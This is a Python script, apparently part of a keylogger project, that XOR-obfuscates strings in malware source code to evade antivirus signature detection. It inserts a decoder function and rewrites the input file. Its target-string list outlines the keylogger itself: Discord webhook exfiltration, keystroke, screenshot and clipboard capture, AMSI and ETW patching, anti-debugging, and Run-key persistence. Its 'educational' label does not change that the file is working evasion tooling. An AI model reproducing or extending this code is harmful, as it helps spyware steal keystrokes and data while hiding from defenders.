#!/usr/bin/env python3
"""
String Obfuscation Tool
Obfuscates sensitive strings in the keylogger to avoid signature detection
Educational purpose: Shows how malware hides from static analysis
"""

import base64
import re


class StringObfuscator:
    """Obfuscates strings to avoid AV signature detection"""

    @staticmethod
    def xor_encode(text, key=0x42):
        """XOR encode a string"""
        return ''.join(chr(ord(c) ^ key) for c in text)

    @staticmethod
    def base64_encode(text):
        """Base64 encode with additional layer"""
        return base64.b64encode(text.encode()).decode()

    @staticmethod
    def generate_decode_function():
        """Generate decoder function to insert in code"""
        return '''
def _d(s, k=0x42):
    """Decode obfuscated string"""
    return ''.join(chr(ord(c) ^ k) for c in s)
'''

    @staticmethod
    def obfuscate_string(text):
        """
        Obfuscate a string using XOR
        Returns the obfuscated version and decode call
        """
        obfuscated = StringObfuscator.xor_encode(text)
        # Escape backslashes and quotes
        obfuscated_escaped = obfuscated.replace('\\', '\\\\').replace('"', '\\"')
        return f'_d("{obfuscated_escaped}")'

    @staticmethod
    def obfuscate_code(code_content, strings_to_obfuscate):
        """
        Obfuscate sensitive strings in code

        Args:
            code_content: Source code as string
            strings_to_obfuscate: List of strings to obfuscate

        Returns:
            Modified code with obfuscated strings
        """
        # Add decoder function at the top (after imports)
        decoder = StringObfuscator.generate_decode_function()

        # Find where to insert (after first block of imports)
        import_end = 0
        for i, line in enumerate(code_content.split('\n')):
            if line.strip() and not line.strip().startswith('#') and not line.strip().startswith('import') and not line.strip().startswith('from'):
                import_end = code_content.find('\n' + line)
                break

        # Insert decoder
        if import_end > 0:
            code_content = code_content[:import_end] + '\n' + decoder + '\n' + code_content[import_end:]

        # Obfuscate each string
        for string in strings_to_obfuscate:
            # Match the string in quotes (both single and double)
            patterns = [
                f'"{string}"',
                f"'{string}'",
            ]

            obfuscated = StringObfuscator.obfuscate_string(string)

            for pattern in patterns:
                code_content = code_content.replace(pattern, obfuscated)

        return code_content


# Sensitive strings that should be obfuscated
SENSITIVE_STRINGS = [
    # Discord/webhook related
    'discord.com/api/webhooks',
    'discord.com',
    'webhook',
    'embeds',

    # Keylogger related
    'keylog',
    'pynput',
    'keyboard',
    'screenshot',
    'clipboard',

    # Windows API related
    'IsDebuggerPresent',
    'VirtualProtect',
    'AmsiScanBuffer',
    'EtwEventWrite',

    # Registry
    'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
    'CurrentVersion\\\\Run',

    # File paths
    'SystemData',
    '.system',

    # Module names (partial)
    'av_evasion',
    'persistence',
    'watchdog',
]


def main():
    """Main function - example usage"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python obfuscate_strings.py <input_file> [output_file]")
        print("\nThis tool obfuscates sensitive strings in Python code")
        print("to avoid AV signature detection.")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file + ".obfuscated.py"

    # Read input
    with open(input_file, 'r', encoding='utf-8') as f:
        code = f.read()

    # Obfuscate
    print(f"[*] Obfuscating strings in {input_file}...")
    obfuscated_code = StringObfuscator.obfuscate_code(code, SENSITIVE_STRINGS)

    # Write output
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(obfuscated_code)

    print(f"[+] Obfuscated code written to {output_file}")
    print(f"[+] Obfuscated {len(SENSITIVE_STRINGS)} string patterns")


if __name__ == "__main__":
    main()
